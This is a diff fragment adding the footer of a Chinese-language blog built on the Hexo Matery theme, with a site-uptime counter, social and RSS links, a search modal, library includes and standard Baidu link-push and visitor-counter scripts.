+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
+                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
+                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    }
+                }
+                setInterval(siteTime, 1000);
+            </script>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/LANVNAL" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:lanvnal@foxmail.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
